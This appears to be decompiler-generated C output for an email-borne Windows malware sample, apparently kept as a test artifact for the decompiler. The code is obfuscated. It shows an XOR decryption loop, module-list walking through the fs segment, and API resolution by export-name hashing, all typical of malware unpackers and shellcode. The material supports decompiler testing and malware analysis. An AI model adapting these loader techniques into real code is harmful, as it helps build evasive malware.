// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0124/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401030(word32 ebp, selector fs)
{
	word32 edi_14;
	word32 edx_15 = fn00401140(fs, out edi_14);
	Mem19[fp + 0x0004A367 - edx_15 + 0x00000040:word32] = edx_15;
	word32 eax_26 = (edx_15 << 0x00000009) + 0xF6F88230 & 0x09468E00 - (edx_15 << 0x00000009);
	word32 edx_35 = fp + 0xFFFB5C25 + dwLoc20;
	Mem36[edx_35 + 0x00000000:word32] = (eax_26 + 0xED71044C)[edx_15 * 0x00000400] - 0x00000028;
	word32 eax_40 = eax_26 + Mem36[((eax_26 + 0xED71044C) + (edx_15 << 0x0000000A)) - 0x00000004:word32] + 0x0004A3EF - dwLoc20;
	word32 esi_44;
	word32 ecx_45 = fn00401250(dwLoc20, out esi_44);
	Mem48[fp - 0x00000060:word32] = fp - 0x00000008;
	Mem50[fp - 0x00000064:word32] = 0x00000004;
	Mem52[fp - 0x00000068:word32] = ecx_45;
	Mem54[fp - 0x0000006C:word32] = esi_44;
	word32 ecx_58 = Mem54[fp + 0xFFFB5C19 + dwLoc20:word32];
	fn00401180(ecx_58, edi_14, ebp);
	Mem60[fp - 0x00000070:word32] = dwLoc20;
	Mem66[fp - 0x00000074:word32] = dwLoc14;
	Mem68[fp - 0x00000078:word32] = eax_40;
	(dwLoc20 + 0x003B6D19)();
	Mem83[fp - 0x0000007C:word32] = 0x00000000;
	word32 v14_80 = eax_40 + 0x0004A3F7 - dwLoc20;
	Mem88[fp - 0x00000080:word32] = v14_80 + 0x00000BCA;
	v14_80();
	int3();
	Mem90[fp - 0x00000084:word32] = fp - 0x00000004;
	word32 edx_94 = Mem90[fp - 0x00000074:word32];
	word32 ecx_113 = Mem90[fp + 0xFFFB5BC1 + edx_94:word32];
	word32 ebx_115 = (fp + 0xFFED7068)[edx_94 * 0x00000004];
	Mem101[fp - 0x00000090:word32] = 0x1349D542;
	word32 eax_104 = Mem101[fp - 0x00000090:word32] - (edx_94 << 0x00000002);
	Mem106[fp - 0x00000090:word32] = 0x0F1F3124;
	Mem107[fp - 0x00000088:word32] = 0x00000001;
	Mem108[fp - 0x0000008C:word32] = Mem107[fp - 0x00000090:word32];
	Mem111[fp - 0x0000008C:word32] = Mem108[fp - 0x0000008C:word32] + (edx_94 << 0x00000002);
	Mem118[ebx_115 + 0x00000000:word32] = Mem111[ebx_115 + 0x00000000:word32] ^ eax_104;
	ecx_113 = ecx_113 - 0x00000004;
	while (ecx_113 > 0x00000000)
	{
		eax_104 = eax_104 + Mem118[fp - 0x0000008C:word32] + Mem118[fp - 0x00000088:word32];
		ebx_115 = ebx_115 + 0x0004A3CB - Mem118[fp - 0x00000074:word32];
		Mem128[fp - 0x00000088:word32] = -Mem118[fp - 0x00000088:word32];
		Mem118[ebx_115 + 0x00000000:word32] = Mem111[ebx_115 + 0x00000000:word32] ^ eax_104;
		ecx_113 = ecx_113 - 0x00000004;
	}
	return;
}

word32 fn00401140(selector fs, ptr32 ediOut)
{
	word32 edi_6;
	word32 eax_16 = fn00401230(fs, 0x00000019, out edi_6) + 0x00000001 + Mem0[0x00401010:word32];
	eax_16();
	word32 edx_27 = Mem0[edi_6 + 0x00000BF4:word32];
	word32 edi_29;
	*ediOut = edi_6 - (edx_27 - 0xBFFB5C91);
	return edx_27 - 0xBFFB5C91;
}

void fn00401180(word32 ecx, word32 edi, word32 dwArg00)
{
	word32 eax_4 = fn00401190(ecx, edi);
	fn004011B0(eax_4, ecx);
	eax_4();
	return;
}

word32 fn00401190(word32 ecx, word32 edi)
{
	return Mem0[Mem0[Mem0[Mem0[Mem0[edi + 0x00000030 + ecx:word32] + 0x0000000C:word32] + 0x0000001C:word32]:word32] + 0x00000008:word32];
}

void fn004011B0(word32 eax, word32 ecx)
{
	word32 esi_24 = Mem0[Mem0[Mem0[eax + ((ecx << 0x00000001) + 0xFFFB5C75) - ecx:word32] + eax + 0x00000078:word32] + eax + 0x00000020:word32] + eax;
	Mem32[fp + 0x0004A3BF - ecx:word32] = 0x5605182A - ecx;
	word32 dwLoc0C_36 = 0x00000000;
	while (dwLoc08 != Mem32[((Mem32[esi_24 + dwLoc0C_36:word32] + eax) + 0xFFFB5C45) + ecx:word32])
		dwLoc0C_36 = dwLoc0C_36 + 0x00000004;
	return;
}

word32 fn00401230(selector fs, word32 dwArg04, ptr32 ediOut)
{
	word32 edi_11;
	*ediOut = Mem0[fs:dwArg04 - 0x00000001:word32];
	return 0xFFFFFFFF;
}

word32 fn00401250(word32 ecx, ptr32 esiOut)
{
	word32 eax_13 = (ecx << 0x0000000A) + 0xEDB0F650 & (ecx << 0x00000009) + 0xF6B77200;
	word32 eax_17 = eax_13 + 0x128F1C3C - (ecx << 0x0000000A);
	word32 esi_14;
	*esiOut = eax_13;
	return Mem0[eax_17 + (Mem0[eax_17 + 0x00000000:word32] + 0x00000014):word32];
}

